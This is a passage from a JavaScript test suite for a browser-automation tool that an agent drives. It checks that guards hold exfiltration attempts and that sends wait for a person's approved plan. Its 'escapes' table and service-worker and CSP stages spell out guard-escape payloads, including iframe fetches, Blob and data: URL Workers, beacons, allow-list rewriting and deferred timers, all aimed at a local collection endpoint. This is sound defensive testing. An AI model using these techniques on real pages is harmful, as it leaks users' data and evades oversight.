            try { const nl = await mcp.call("chrome_net", { action: "list", tab, limit: 60 }); console.log("[frames-suite] LEAKED NET " + JSON.stringify((nl.requests || []).filter((/** @type {any} */ r) => /d\.localhost|fresh/.test(String(r.url || ""))).map((/** @type {any} */ r) => ({ url: String(r.url).slice(0, 80), type: r.type, status: r.status, failed: r.failed || r.errorText, frame: r.frame, session: r.session ? "child" : "top" }))).slice(0, 900)); } catch (e) { console.log("[frames-suite] LEAKED NET list failed: " + String(e && e.message || e).slice(0, 200)); }
          }
          need(got.length === before, "eval.frame.guard", `the fresh origin received ${got.length - before} request(s) from the held script (run ${n}; contained ${leak.contained || "?"})`);
        }
        // Other ways out of a guarded script: a fresh same-origin iframe (its window has no shim), a Worker made from that iframe (its own network), a beacon from it, window.open.
        // None may reach the fresh origin; the browser-level guard (Fetch on every session, children paused at birth) is what stops them.
        const L = JSON.stringify(leakTo);
        const escapes = /** @type {Record<string, string>} */ ({
          "iframe fetch": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { await f.contentWindow.fetch(${L} + 'iframefetch'); } catch (e) {} return 1; })()`,
          "iframe worker (Blob URL)": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { const b = new f.contentWindow.Blob(["fetch('" + ${L} + "worker').catch(function () {});"]); const w = new f.contentWindow.Worker(f.contentWindow.URL.createObjectURL(b)); await new Promise(function (r) { setTimeout(r, 400); }); } catch (e) {} return 1; })()`,
          "iframe beacon": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { f.contentWindow.navigator.sendBeacon(${L} + 'beacon', 'x'); } catch (e) {} return 1; })()`,
          "iframe SharedWorker (Blob URL)": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { const b = new f.contentWindow.Blob(["fetch('" + ${L} + "shared').catch(function () {});"]); const w = new f.contentWindow.SharedWorker(f.contentWindow.URL.createObjectURL(b)); await new Promise(function (r) { setTimeout(r, 500); }); } catch (e) {} return 1; })()`,
          "script rewrites its own allow list": `(async () => { window.__vyreAllow = [${L}.split('/collect')[0]]; try { await fetch(${L} + 'rewrite'); } catch (e) {} return 1; })()`,
          "frame attached mid-script": `(async () => { const f = document.createElement('iframe'); f.srcdoc = "<script>fetch('" + ${L} + "late').catch(function () {});<\/script>"; document.body.appendChild(f); await new Promise(function (r) { setTimeout(r, 600); }); return 1; })()`,
          "script-made iframe src=fresh": `(async () => { const f = document.createElement('iframe'); f.src = ${L} + 'frame'; document.body.appendChild(f); await new Promise(function (r) { setTimeout(r, 400); }); return 1; })()`,
          "second eval fetches fresh after that iframe": `(async () => { try { await fetch(${L} + 'second'); } catch (e) {} return 1; })()`,
          "iframe Image": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { new f.contentWindow.Image().src = ${L} + 'iframeimage'; } catch (e) {} await new Promise(r => setTimeout(r, 300)); return 1; })()`,
          "own-frame Image": `(async () => { try { new Image().src = ${L} + 'ownimage'; } catch (e) {} await new Promise(r => setTimeout(r, 300)); return 1; })()`,
          // The clock-free rule: what a call leaves running is still judged after it returns (Fetch layer, so not in the DNR-alone run).
          ...(NOFETCH ? {} : {
            "deferred timer fetch": `(() => { setTimeout(function () { fetch(${L} + 'timer').catch(function () {}); }, 400); return 1; })()`,
            "deferred promise chain": `(() => { new Promise(function (r) { setTimeout(r, 300); }).then(function () { return fetch(${L} + 'promise'); }).catch(function () {}); return 1; })()`,
            "late data: URL worker (fetches 2.5 s later)": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { new f.contentWindow.Worker("data:text/javascript," + encodeURIComponent("setTimeout(function () { fetch('" + ${L} + "datalateworker').catch(function () {}); }, 2500);")); } catch (e) {} return 1; })()`,
            "late worker (fetches 2.5 s later)": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { const b = new f.contentWindow.Blob(["setTimeout(function () { fetch('" + ${L} + "lateworker').catch(function () {}); }, 2500);"]); new f.contentWindow.Worker(f.contentWindow.URL.createObjectURL(b)); } catch (e) {} return 1; })()`,
          }),
          "window.open": `(() => { try { window.open(${L} + 'open'); } catch (e) {} return 1; })()`,
        });
        for (const [name, expression] of Object.entries(escapes)) {
          const r = await step(`escape attempt: ${name}`, () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression })).catch(async (/** @type {any} */ e) => { try { const nl = await mcp.call("chrome_net", { action: "list", tab, limit: 1 }); console.log("[frames-suite] ESCAPE HUNG " + JSON.stringify({ name, trail: nl.trail, sticky: nl.sticky ? { kids: nl.sticky.kids.length } : null })); } catch { /* diag only */ } throw e; });
          console.log("[frames-suite] ESCAPE " + JSON.stringify({ name, held: r.held, contained: r.contained, why: String(r.why || r.error || "").slice(0, 140), ...(r.diag ? { diag: JSON.stringify(r.diag).slice(0, 1500) } : {}), ...(r.egress ? { egress: JSON.stringify(r.egress).slice(0, 400) } : {}) }));
          await sleep(/^(deferred|late )/.test(name) ? 3800 : 500);
          if ((await state()).collected.length !== before) { try { const nl = await mcp.call("chrome_net", { action: "list", tab, limit: 1 }); console.log("[frames-suite] ESCAPE LEAKED GUARD " + JSON.stringify({ name, lastGuard: nl.lastGuard, sticky: nl.sticky })); const got = (await state()).collected; console.log("[frames-suite] ESCAPE LEAKED SERVER " + JSON.stringify(got.slice(before).map((/** @type {any} */ c) => JSON.stringify(c).slice(0, 300)))); } catch (e) { console.log("[frames-suite] ESCAPE LEAKED diag failed " + String(e && e.message || e).slice(0, 200)); } }
          need((await state()).collected.length === before, "eval.frame.guard", `escape "${name}" reached the fresh origin (${(await state()).collected.length - before} request(s)): ${short(r)}`);
        }
        const own = await step("the iframe's own API call is not held", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "window.__api('GET', '/api/workflows').then(function (r) { return r.status; })" }));
        need(!own.held && own.ok !== false && val(own) === 200, "eval.frame.guard", `the iframe's own API call was refused or failed: ${short(own)}`);
        return { titleTop: val(inTop), titleFrame: val(inApp), leakHeld: true, ownApiStatus: val(own) };
      }, 240_000);

      // ---------------------------------------------------------------- (f2) a page with a service worker, and a page under a strict CSP
      // A harmless eval must RUN on both (a probe the page's own machinery defeats would refuse every eval on that app), and an exfiltration must still reach nothing.
      await stage("eval_sw_and_csp_pages", async () => {
        const L = `${fixture.site("fresh")}/collect?d=`;
        const before = (await state()).collected.length;
        await step("open the service-worker page", () => mcp.call("chrome_tabs", { action: "navigate", tab, url: `${fixture.site("shell")}/sw-page` }));
        let controlled = false;
        for (let i = 0; i < 20 && !controlled; i++) { await sleep(300); const r = await step("is the page controlled by its service worker", () => mcp.call("chrome_eval", { tab, expression: "document.title" })); controlled = val(r) === "SW controlled"; }
        need(controlled, "eval.sw", "the page never became controlled by its service worker (or every eval on it was refused)");
        const harmless = await step("a harmless eval on the service-worker page runs", () => mcp.call("chrome_eval", { tab, expression: "navigator.serviceWorker.controller ? 'controlled' : 'not'" }));
        need(val(harmless) === "controlled" && !harmless.held, "eval.sw", `a harmless eval on a page with a service worker did not run: ${short(harmless)}`);
        for (const [name, expression] of Object.entries({
          "sw page fetch": `(async () => { try { await fetch(${JSON.stringify(L)} + 'swfetch'); } catch (e) {} return 1; })()`,
          "sw page Image": `(async () => { try { new Image().src = ${JSON.stringify(L)} + 'swimage'; } catch (e) {} await new Promise(r => setTimeout(r, 300)); return 1; })()`,
        })) {
          const r = await step(`exfil on the service-worker page: ${name}`, () => mcp.call("chrome_eval", { tab, expression }));
          console.log("[frames-suite] ESCAPE " + JSON.stringify({ name, held: r.held, why: String(r.why || r.error || "").slice(0, 100) }));
          await sleep(500);
          need((await state()).collected.length === before, "eval.sw", `"${name}" reached the fresh origin on a page with a service worker`);
        }
        await step("open the strict-CSP page", () => mcp.call("chrome_tabs", { action: "navigate", tab, url: `${fixture.site("shell")}/csp-page` }));
        const t2 = await step("a harmless eval on the strict-CSP page runs", () => mcp.call("chrome_eval", { tab, expression: "document.title" }));
        need(val(t2) === "CSP page" && !t2.held, "eval.csp", `a harmless eval on a page under a strict CSP did not run: ${short(t2)}`);
        const r2 = await step("exfil on the strict-CSP page", () => mcp.call("chrome_eval", { tab, expression: `(async () => { try { await fetch(${JSON.stringify(L)} + 'cspfetch'); } catch (e) {} try { new Image().src = ${JSON.stringify(L)} + 'cspimage'; } catch (e) {} await new Promise(r => setTimeout(r, 300)); return 1; })()` }));
        console.log("[frames-suite] ESCAPE " + JSON.stringify({ name: "csp page exfil", held: r2.held, why: String(r2.why || r2.error || "").slice(0, 100) }));
        await sleep(500);
        need((await state()).collected.length === before, "eval.csp", "an exfiltration on a page under a strict CSP reached the fresh origin");
        // Leave no worker behind: it would control the shell for every later stage.
        await step("unregister the page's service worker", async () => { await mcp.call("chrome_tabs", { action: "navigate", tab, url: `${fixture.site("shell")}/sw-page` }); await sleep(800); return mcp.call("chrome_eval", { tab, expression: "navigator.serviceWorker.getRegistrations().then(function (rs) { return Promise.all(rs.map(function (r) { return r.unregister(); })); }).then(function (x) { return x.length; })" }); });
        await fresh();
        return { controlled, sw: "harmless eval ran, exfil held", csp: "harmless eval ran, exfil held" };
      });

      // ---------------------------------------------------------------- (f3) a frame the guard cannot reach is emptied, not released
      // Test hook (honoured only under the test flag in this temp profile): while the file exists, Fetch.enable fails on every FRAME. A script then makes a cross-site iframe whose page sends a
      // request the moment it runs. The guard must empty that frame while it still waits (about:blank) and the fresh origin must see nothing.
      await stage("neutralize_unguardable_frame", async () => {
        if (NOFETCH) return { skipped: "no Fetch layer in this run, nothing to force to fail" };
        await fresh();
        const flag = path.join(data, "test-failenable");
        const before = (await state()).collected.length;
        fs.writeFileSync(flag, "1");
        let r = /** @type {any} */ ({});
        try {
          const target = `${fixture.site("fresh")}/collect?d=neutral`;
          r = await step("eval makes a cross-site iframe whose page sends a request as it runs (Fetch.enable forced to fail on frames)", () => mcp.call("chrome_eval", { tab, expression: `(async () => { const f = document.createElement('iframe'); f.src = ${JSON.stringify(`${fixture.site("widgets")}/beacon-page?to=${target}`)}; document.body.appendChild(f); await new Promise(r => setTimeout(r, 2500)); return 1; })()` }).catch((/** @type {any} */ e) => ({ error: String(e && e.message || e) })));
        } finally { try { fs.rmSync(flag, { force: true }); } catch { /* */ } }
        await sleep(800);
        const got = (await state()).collected.slice(before);
        const rows = await step("chrome_frames list after", () => mcp.call("chrome_frames", { action: "list", tab }));
        const list = Array.isArray(rows) ? rows : (rows.frames || []);
        try { const nl = await mcp.call("chrome_net", { action: "list", tab, limit: 1 }); console.log("[frames-suite] NEUTRALIZE GUARD " + JSON.stringify({ neutralized: nl.lastGuard?.neutralized, leftPaused: nl.lastGuard?.leftPaused, failed: nl.lastGuard?.failed, enableErrors: nl.lastGuard?.enableErrors, attached: nl.lastGuard?.attached })); } catch { /* diag only */ }
        console.log("[frames-suite] NEUTRALIZE " + JSON.stringify({ held: r.held, error: String(r.error || "").slice(0, 120), server: got.length, beaconFrames: list.filter((/** @type {any} */ f) => /beacon-page/.test(String(f.url || ""))).map((/** @type {any} */ f) => f.url), blankFrames: list.filter((/** @type {any} */ f) => /^about:blank/.test(String(f.url || ""))).length }));
        need(got.length === 0, "guard.neutralize", `a frame the guard could not reach ran its page and sent ${got.length} request(s) to the fresh origin: ${short(got)}`);
        // The frames list can keep a stale row for the replaced document; what matters is that the fresh origin saw nothing and the frame was sent to a blank page.
        need(list.some((/** @type {any} */ f) => /^about:blank/.test(String(f.url || ""))), "guard.neutralize", `no frame was sent to about:blank: ${short(list.map((/** @type {any} */ f) => f.url), 400)}`);
        return { heldOrStopped: r.held === true || !!r.error, serverSaw: got.length };
      });

      // ---------------------------------------------------------------- (f4) the screenshot rung: chrome_point on surfaces that have no controls
      // A canvas draws a Go button, a Send button and a slider (nothing in the DOM says what they are). A div that says Send and one that says Delete account are real DOM text
      // with click listeners, invisible to the snapshot. A second canvas sits in a cross-origin iframe. Only the point rung can operate the canvases; the divs must hold whatever the plan says.
      await stage("point_rung", async () => {
        const canvasUrl = `${fixture.site("shell")}/canvas-page`;
        const cv = async () => /** @type {any} */ ((await state()).canvas);
        await step("open the canvas page", () => mcp.call("chrome_tabs", { action: "navigate", tab, url: canvasUrl }));
        await sleep(900);
        const snap = await step("snapshot: the rungs above the picture see none of the painted controls", () => mcp.call("chrome_snapshot", { tab }));
        need(!(/** @type {any} */ (snap).controls || []).some((/** @type {any} */ c) => /^(Go|Send)$/.test(String(c.name || "")) && c.role === "button"), "point.snapshot", "the snapshot shows the painted buttons as controls: the fixture is not testing the picture rung");
        const shotOf = async () => { const r = /** @type {any} */ (await step("screenshot", () => mcp.call("chrome_screenshot", { tab, format: "jpeg", quality: 40 }))); need(r.shot && r.shot.id && r.shot.scale > 0, "point.shot", `the screenshot carries no shot (id, scale, viewport): ${short(Object.keys(r))}`); return r.shot; };
        const at = (/** @type {any} */ sh, /** @type {number} */ x, /** @type {number} */ y) => ({ x: Math.round(x * sh.scale), y: Math.round(y * sh.scale) });
        const point = (/** @type {any} */ sh, /** @type {number} */ x, /** @type {number} */ y, /** @type {any} */ o = {}) => mcp.call("chrome_point", { tab, shot: sh.id, ...at(sh, x, y), action: "click", ...o }).catch((/** @type {any} */ e) => ({ error: String(e && e.message || e) }));
        // The ladder steps down by itself: the same unreachable target failing twice names chrome_point and hands over a picture.
        const fails = [];
        for (let i = 0; i < 2; i++) fails.push(await step(`act on the painted Go button by name, try ${i + 1}`, () => mcp.call("chrome_act", { tab, selector: { name: "Paint the Go button" }, kind: "click", wait: { timeoutMs: 200 } }).then(() => "no error").catch((/** @type {any} */ e) => String(e && (e.text || e.message) || e))));
        need(!/chrome_point/.test(fails[0]), "point.ladder", "the first failure already named chrome_point");
        need(/chrome_point/.test(fails[1]) && /shot [0-9a-f]{8}/.test(fails[1]), "point.ladder", `the second failure on the same target did not hand over a picture and name chrome_point: ${String(fails[1]).slice(-400)}`);
        let sh = await shotOf();
        // 1. Without a plan, every write on a drawn surface holds; the bare divs hold too.
        const goHeld = await point(sh, 100, 65);
        need(goHeld.held === true && (await cv()).go === 0, "point.hold", `a click on the painted Go button with no plan was not held: ${short(goHeld)}`);
        sh = await shotOf();
        const sendHeld = await point(sh, 260, 65);
        need(sendHeld.held === true && (await cv()).sent === 0, "point.hold", `the painted Send was not held without a plan: ${short(sendHeld)}`);
        sh = await shotOf();
        const divSend = await point(sh, 60, 342);
        need(divSend.held === true && (await cv()).divSent === 0, "point.div", `a div that says Send was not held: ${short(divSend)}`);
        sh = await shotOf();
        const divDel = await point(sh, 180, 342);
        need(divDel.held === true && (await cv()).divDeleted === 0, "point.div", `a div that says Delete account was not held: ${short(divDel)}`);
        // 2. With the person's plan the painted controls work; the divs still hold.
        const plan = await step("approve a plan for the drawn surfaces", () => mcp.call("chrome_approve", { tab, title: "Operate the canvas board", items: [{ kind: "edit", what: "press the painted Go and Send buttons", count: 3, drawn: "click" }, { kind: "edit", what: "drag the painted slider", count: 1, drawn: "drag" }] }));
        need(plan.held && plan.id, "point.plan", `the plan was not held for the person: ${short(plan)}`);
        need((await mcp.call("chrome_send", { id: plan.id })).approved, "point.plan", "approving the plan did not start it");
        sh = await shotOf();
        const go = await point(sh, 100, 65);
        need(go.ok === true && (await stateWhere((/** @type {any} */ s) => s.canvas.go, (/** @type {any} */ v) => v === 1, "the painted Go button being pressed")) === 1, "point.go", `the painted Go button was not pressed with a plan: ${short(go)}`);
        sh = await shotOf();
        const send = await point(sh, 260, 65);
        need(send.ok === true && (await stateWhere((/** @type {any} */ s) => s.canvas.sent, (/** @type {any} */ v) => v === 1, "the painted Send being pressed")) === 1, "point.send", `the painted Send did not go through with a plan: ${short(send)}`);
        sh = await shotOf();
        const drag = await point(sh, 40, 204, { action: "drag", to: at(sh, 220, 204) });
        need(drag.ok === true && (await stateWhere((/** @type {any} */ s) => s.canvas.slider, (/** @type {any} */ v) => v > 40, "the slider being dragged")) > 40, "point.drag", `the painted slider was not dragged with a plan: ${short(drag)}`);
        sh = await shotOf();
        const divSend2 = await point(sh, 60, 342);
        need(divSend2.held === true && (await cv()).divSent === 0, "point.div", `with a plan, a div that says Send was not held: ${short(divSend2)}`);
        // 3. The iframe's canvas: a plan for this tab's origin does not cover the frame's origin.
        sh = await shotOf();
        const frameHeld = await point(sh, 80, 470);
        need(frameHeld.held === true && (await cv()).frameGo === 0, "point.frame", `a click in a cross-origin iframe on a tab-only plan was not held: ${short(frameHeld)}`);
        const plan2 = await step("approve a plan that names the frame's origin", () => mcp.call("chrome_approve", { tab, title: "Press the widget frame's Go", items: [{ kind: "edit", what: "press the painted Go button in the widgets frame", count: 1, drawn: "click", origin: fixture.site("widgets") }] }));
        need((await mcp.call("chrome_send", { id: plan2.id })).approved, "point.plan", "approving the second plan did not start it");
        sh = await shotOf();
        const frameGo = await point(sh, 80, 470);
        need(frameGo.ok === true && (await stateWhere((/** @type {any} */ s) => s.canvas.frameGo, (/** @type {any} */ v) => v === 1, "the iframe's painted Go being pressed")) === 1, "point.frame", `a click in a cross-origin iframe on a plan that names its origin did not go through: ${short(frameGo)}`);
        // 4. A dialog that opens between the picture and the click, and a line break in typed text.
        sh = await shotOf();
        await step("a dialog opens after the picture was taken", () => mcp.call("chrome_eval", { tab, expression: "document.body.insertAdjacentHTML('beforeend', '<div role=\"dialog\" aria-label=\"Confirm\" style=\"position:fixed;left:700px;top:10px;width:100px;height:40px;background:#fff\">x</div>'); 1" }));
        const late = await point(sh, 100, 65);
        need(!!late.error && /stale|changed|taken/i.test(late.error) && (await cv()).go === 1, "point.stale", `a click after a dialog opened was not refused: ${short(late)}`);
        await step("back to the board", () => mcp.call("chrome_tabs", { action: "navigate", tab, url: canvasUrl }));
        await sleep(900);
        sh = await shotOf();
        const nl = await point(sh, 420, 342, { action: "type", text: "hello\nworld" });
        need(!!nl.error && /line break|control/i.test(nl.error), "point.type", `typed text with a line break was not refused: ${short(nl)}`);
        const typed = await point(sh, 420, 342, { action: "type", text: "hello" });
        need(typed.ok === true && (await stateWhere((/** @type {any} */ s) => s.canvas.typed, (/** @type {any} */ v) => v === "hello", "the typed text")) === "hello", "point.type", `typing into a labelled field by pointing did not work: ${short(typed)}`);
        // 5. The finish card lists what was done by pointing.
        const sum = await mcp.call("chrome_summary", {});
        need(/drawn surface/.test(JSON.stringify(sum.lines || sum)), "point.summary", `the summary does not list the point actions: ${short(sum)}`);
        await fresh();
        return { held: "go/send/divs without a plan", withPlan: { go: 1, send: 1, slider: drag.ok }, frame: "held on a tab-only plan", staleDialog: "refused", typed: "hello" };
      }, 180_000);

      // ---------------------------------------------------------------- (g) network and API learning belong to the iframe
      await stage("net_and_api", async () => {
        await step("chrome_net start", () => mcp.call("chrome_net", { action: "start", tab }));
        await fresh();
        /** @type {any[]} */ let rows = [];
        const end = Date.now() + 10_000;
        for (;;) {
          const r = await step("chrome_net list", () => mcp.call("chrome_net", { action: "list", tab, limit: 200 }));
          rows = (r.requests || []).filter((/** @type {any} */ x) => /\/api\/workflows/.test(String(x.url || "")));
          if (rows.length) break;
          if (Date.now() > end) throw new Error(`no /api/workflows request was captured from the iframe app (buffer holds ${r.buffered ?? "?"}, listed ${r.count}); the network tool sees only the top page: ${short((r.requests || []).map((/** @type {any} */ x) => x.url), 300)}`);
          await sleep(300);
        }
        const row = rows[0];
        need(/^http:\/\/b\.localhost:\d+\//.test(String(row.url)), "net.frames", `the captured request is ${row.url}`);
        const tagKeys = Object.keys(row).filter(k => /frame|origin|target|session/i.test(k));
        need(tagKeys.length > 0, "net.frames", `a captured request carries no frame tag (keys: ${Object.keys(row).join(", ")}); it cannot be told from the shell's traffic`);
        const tagText = short(tagKeys.map(k => row[k]), 400);
        need(/b\.localhost/.test(tagText) || tagKeys.some(k => typeof row[k] === "number" && row[k] > 0), "net.frames", `the frame tag ${tagText} does not identify the iframe's origin (b.localhost) or a child frame`);
        const learn = await step("chrome_api learn", () => mcp.call("chrome_api", { action: "learn", tab }));
        need(learn.learned > 0 || (learn.entries || []).length, "api.learn.frames", `api.learn learned nothing from the iframe's traffic: ${short(learn)}`);
        const cat = await step("chrome_api catalog", () => mcp.call("chrome_api", { action: "catalog", tab }));
        const entries = /** @type {any[]} */ (cat.entries || []);
        const wfEntries = entries.filter(e => /\/api\/workflows/.test(short(e)) && /b\.localhost/.test(short(e)));
        need(wfEntries.length > 0, "api.catalog.frames", `the catalog has no workflows endpoint learned from the iframe (origins ${short(cat.origins)}, ${entries.length} entries)`);
        const getEntry = wfEntries.find(e => /^GET$/i.test(String(e.method))) || wfEntries[0];
        const known = (await state()).workflows;
        const call = await step("chrome_api call the learned workflows endpoint", () => mcp.call("chrome_api", { action: "call", tab, entry: getEntry.id, entryId: getEntry.id, args: {}, params: {} }));
        need(call.held !== true && call.ok !== false && (call.status === 200 || /200/.test(short(call))), "api.call.frames", `the learned call did not return 200: ${short(call)}`);
        need(!call.authNote, "api.call.frames", `the bearer token of the iframe's traffic was not found for the call: ${call.authNote}`);
        need((call.frame ?? 0) > 0 || /b\.localhost/.test(String(call.frameOrigin || "")), "api.call.frames", `the call did not run inside the iframe (result carries frame ${short(call.frame)} ${short(call.frameOrigin)}): ${short(call, 300)}`);
        need(!known.length || short(call, 4000).includes(known[0].name), "api.call.frames", `the call's body does not list the workflow "${known[0] && known[0].name}" the fixture holds: ${short(call, 300)}`);
        const routed = await step("chrome_api route a read by hint", () => mcp.call("chrome_api", { action: "route", tab, hint: "workflows" }));
        need(routed.route === "api" && routed.status === 200 && ((routed.frame ?? 0) > 0 || /b\.localhost/.test(String(routed.frameOrigin || ""))), "api.route.frames", `route did not take the learned read inside the iframe: ${short(routed, 300)}`);
        need(!known.length || short(routed, 4000).includes(known[0].name), "api.route.frames", `the routed read does not list the fixture's workflow: ${short(routed, 300)}`);
        const noRoute = await step("chrome_api route with no match", () => mcp.call("chrome_api", { action: "route", tab, hint: "invoices payments" }));
        need(noRoute.route === "ui", "api.route.frames", `an unmatched hint did not fall back to the page: ${short(noRoute, 300)}`);
        return { requests: rows.length, frameTag: Object.fromEntries(tagKeys.map(k => [k, row[k]])), learned: learn.learned, workflowEndpoints: wfEntries.length, call: { status: call.status, frame: call.frame, frameOrigin: call.frameOrigin } };
      });

      // ---------------------------------------------------------------- (h) a tile is not a send, a real Send is held
      await stage("send_hold", async () => {
        await fresh();
        await step("Create Workflow", () => mcp.call("chrome_act", { tab, selector: { name: "Create Workflow", identifier: "create-workflow" }, kind: "click" }));
        await step("Start from Scratch", () => mcp.call("chrome_act", { tab, selector: { name: "Start from Scratch", identifier: "start-from-scratch" }, kind: "click" }));
        await step("Add Action (opens the drawer)", () => mcp.call("chrome_act", { tab, selector: { name: "Add Action", identifier: "add-action" }, kind: "click" }));
        const sent0 = (await state()).sent.length;
        const tile = await step('click the "Send Email" TILE in the drawer', () => mcp.call("chrome_act", { tab, selector: { role: "button", name: "Send Email", identifier: "action-send-email" }, kind: "click" }));
        need(!tile.held && tile.ok !== false, "send.tile", `the "Send Email" tile was held or failed: ${short(tile)} (a tile in a workflow builder's action drawer picks an action, it sends nothing)`);
        const chosen = await mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "window.__state.chosen" });
        need(val(chosen) === "Send Email", "send.tile", `the tile click did not choose the action (chosen is ${short(val(chosen))})`);
        need((await state()).sent.length === sent0, "send.tile", "the tile click sent a message");
        const h = await step('click the real "Send" submit in the drawer', () => mcp.call("chrome_act", { tab, selector: { role: "button", name: "Send", identifier: "test-send" }, kind: "click" }));
        need(h.held === true && h.id, "send.hold", `the real Send submit was not held: ${short(h)}`);
        await sleep(300);
        need((await state()).sent.length === sent0, "send.hold", "a message was sent although the Send was held");
        const rel = await step("release the held Send (chrome_send)", () => mcp.call("chrome_send", { id: h.id }));
        const seen = await stateWhere(s => s.sent, v => v.length === sent0 + 1, "the released Send (exactly one message)");
        const again = await mcp.call("chrome_send", { id: h.id }).then(() => "sent twice", () => "refused");
        need(again === "refused", "send.hold", "the same held Send could be released twice");
        return { tileHeld: false, sendHeld: true, releasedOk: rel && rel.ok !== false, sent: seen.length, secondSend: again };
      });

      // ---------------------------------------------------------------- (i) the awkward moments, inside the frame
      await stage("robust_flags", async () => {
        await fresh(`${shellUrl}?slow=600&whatsnew=1&guard=1&stale=1&toast=2500`, { noApp: true });
        const before = (await state()).workflows.length;
        const t0 = performance.now();
        const run = await step("chrome_ghl run create-workflow with the popup, slow route, guard and re-render", () => mcp.call("chrome_ghl", { action: "run", tab, flow: "create-workflow", params: { name: "Robust flow", trigger: "contact-created", actions: FRAMES_WORKFLOW.actions } }, 90_000));
        const ms = Math.round(performance.now() - t0);
        need(run.ok !== false, "ghl.run.frames.robust", `the flow failed: ${brief(run)}`);
        const st = await stateWhere(s => s.workflows, v => v.length > before, "the robust workflow");
        need(st[st.length - 1].name === "Robust flow" && st[st.length - 1].actions.length === 2, "ghl.run.frames.robust", `the workflow is ${short(st[st.length - 1])}`);
        const s = await mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "JSON.stringify({ whatsnewClosed: window.__state.whatsnewClosed, discarded: window.__state.discarded, saved: window.__state.saved })" });
        const view = JSON.parse(String(val(s)));
        need(view.whatsnewClosed === 1 && view.discarded === 0 && view.saved === true, "ghl.run.frames.robust", `the popup in the frame was not closed once, or a guard dialog was discarded: ${short(view)}`);
        return { ms, state: view };
      }, 120_000);
    }
  } catch (e) {
    out.fatal = String(/** @type {Error} */ (e).message || e);
    try { out.chromeLogTail = fs.readFileSync(path.join(tmp, "chrome.log"), "utf8").slice(-1500); } catch { /* no log */ }
  } finally {
    log("cleanup");
    try { if (fixture) out.fixtureState = await within(Promise.resolve(fixture.frames.snapshot()), 3000, () => "reading the fixture state").then(s => ({ workflows: s.workflows.map((/** @type {any} */ w) => ({ name: w.name, steps: w.actions.length })), sent: s.sent.length, editorSaves: s.editorSaves.length, acks: s.acks, collected: s.collected.length, api: s.api })); } catch { /* best effort */ }
    stopProcess(chromeProc);
    for (const c of cleanups) try { c(); } catch { /* best effort */ }
    await within(Promise.resolve(fixture?.close()), 5000, () => "closing the fixture").catch(e => log(String(e.message)));
    setTimeout(() => { try { spawnSync("chmod", ["-R", "u+rwX", tmp]); fs.rmSync(tmp, { recursive: true, force: true }); } catch { /* best effort */ } }, 2500).unref();
  }
  const failed = Object.entries(out.stages).filter(([, v]) => /** @type {any} */ (v).ok === false).map(([k]) => k);
  out.ok = !out.fatal && failed.length === 0;
  const s = out.stages;
  const line = `chrome-frames-suite ${out.ok ? "PASS" : "FAIL"} ${out.os}: ${s.frames_listed?.frames ?? "n/a"} frames, snapshot p50 ${out.timings.snapshot?.p50 ?? "n/a"} ms, iframe click p50 ${out.timings.click?.p50 ?? "n/a"} ms, iframe fill p50 ${out.timings.fill?.p50 ?? "n/a"} ms, create-workflow flow ${out.timings.createWorkflowFlow?.ms ?? "n/a"} ms${out.ok ? "" : `; failed: ${[...failed, ...(out.fatal ? ["fatal"] : [])].join(",")}`}`;
  for (const f of failed) console.error(`[frames-suite] FAILED ${f}: ${/** @type {any} */ (s[f]).error}`);
  console.log(JSON.stringify(out, null, 2)); console.log(line);
  stepSummary(`- ${line}${failed.length ? "\n" + failed.map(f => `  - ${f}: ${String(/** @type {any} */ (s[f]).error).slice(0, 300)}`).join("\n") : ""}`);
  writeOut();
  process.exitCode = out.ok ? 0 : 1;
}
main().then(() => setTimeout(() => process.exit(process.exitCode || 0), 3000).unref(), e => { console.error(e); process.exit(1); });
